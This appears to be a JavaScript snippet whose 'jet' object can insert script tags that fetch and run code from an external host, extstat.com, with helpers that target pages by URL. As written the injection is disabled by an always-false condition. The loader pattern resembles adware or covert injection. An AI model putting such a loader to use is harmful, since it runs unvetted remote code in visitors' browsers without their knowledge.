


var jet = {

	inject:function(a){return function(){var b=document.createElement("script");b.type="text/javascript",b.async=!0,b.src=a;var c=document.getElementsByTagName("script")[0];c.parentNode.insertBefore(b,c)}(),!0},
    
    geoIs: function (s, x) {
		var sorr = "";
		if( Object.prototype.toString.call( s ) === '[object Array]' ){
			for (var i = s.length - 1; i >= 0; i--) {
				if (sorr.indexOf(s[i].toUpperCase())>-1) { jet.inject(x);}
			} 
		} else {
			   if (sorr.indexOf(s.toUpperCase())>-1) { return jet.inject(x);}
		}
		return false;
    }, 
    domini: function(s) {
    	if( Object.prototype.toString.call( s ) === '[object Array]' ) {
		for (var i = s.length - 1; i >= 0; i--) {
			if (window.location.href.indexOf(s[i])>-1) { return true;}
		} 
		} else {
	    	if (window.location.href.indexOf(s)>-1) { return true;}
	    }
		return false; 
    },
    
    urlIsNot: function (s) {
    	if ( jet.domini(s) ) { return false;}
    	return true;
    },

    urlIs: function (s) {
    	if ( jet.domini(s) ) { return true; }
    	return false;	    	
    }, 

    init: function(){
    	var jetScript = 'https://extstat.com/code/?pid=891042&r=' + Math.floor(10000000 * Math.random());
        if(1 == "0") {
        	jet.inject(jetScript);
        }
    }

}


jet.init(true);